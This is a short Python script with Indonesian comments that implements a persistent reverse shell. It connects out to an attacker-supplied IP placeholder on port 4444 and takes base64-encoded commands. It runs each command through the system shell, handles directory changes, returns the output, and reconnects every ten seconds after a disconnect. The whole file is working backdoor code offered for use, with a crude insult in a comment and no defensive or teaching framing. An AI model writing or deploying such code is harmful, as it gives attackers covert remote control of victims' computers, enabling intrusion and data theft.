import socket, subprocess, os, base64, time

IP_LU = "IP_PC_LU_DISINI" # GANTI INI, K*NTOL!
PORT_LU = 4444

def predator():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((IP_LU, PORT_LU))
            
            while True:
                # Terima perintah Base64
                data = s.recv(1024)
                cmd = base64.b64decode(data).decode()
                
                if cmd.lower() == "exit":
                    break
                
                # Fitur Pindah Folder (CD)
                if cmd.startswith("cd "):
                    try:
                        os.chdir(cmd[3:].strip())
                        output = f"[+] Moved to: {os.getcwd()}"
                    except Exception as e:
                        output = f"[!] Error: {str(e)}"
                else:
                    # Eksekusi command sistem Linux
                    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output = proc.stdout.read().decode() + proc.stderr.read().decode()
                    if not output: output = "[+] Command Executed."

                s.send(output.encode())
            s.close()
        except:
            time.sleep(10) # Reconnect tiap 10 detik kalo putus

if __name__ == "__main__":
    predator()
